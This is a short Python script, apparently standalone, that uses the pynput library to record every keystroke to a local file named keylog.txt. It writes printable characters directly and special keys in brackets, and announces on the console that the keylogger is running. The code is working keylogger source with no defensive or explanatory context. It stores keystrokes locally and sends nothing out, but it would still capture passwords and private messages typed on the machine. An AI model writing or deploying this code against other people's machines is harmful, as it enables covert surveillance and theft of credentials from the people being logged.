from pynput import keyboard

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            if hasattr(key, 'char'):  # Printable keys
                f.write(key.char)
            else:  # Special keys (e.g., Enter, Shift)
                f.write(f" [{key}] ")
    except Exception as e:
        print(f"Error: {e}")

def main():
    print("Keylogger is running... Press 'Ctrl + C' to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
